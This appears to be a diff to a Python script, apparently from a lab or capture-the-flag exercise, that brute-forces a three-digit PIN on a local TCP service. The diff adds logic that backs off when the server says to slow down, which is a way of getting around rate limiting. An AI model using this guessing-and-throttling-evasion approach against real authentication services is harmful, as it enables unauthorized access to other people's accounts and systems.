@@ -1,8 +1,12 @@
 import socket
+import time 
+
 
 # Server Details
 Address = '127.0.0.1'
 Port = 8888
+
+sleep_time=1.0
 
 for pin in range(0, 1000):
     formatted_pin = f"{pin:03d}"
@@ -36,7 +40,9 @@ decoded_response = response.decode(errors="ignore")
 if "congratulations" in decoded_response.lower() or "access granted" in decoded_response.lower() or "welcome" in decoded_response.lower():
     print(f"[+] Found correct PIN: {formatted_pin}")
     print(decoded_response)
-    break
+elif "slow down" in decoded_response.lower():
+    print(f"[!] Server said slow down after PIN {formatted_pin}. Increasing sleep time...")
+    sleep_time += 0.5
 else:
     print(f"[-] Tried PIN: {formatted_pin}")
 
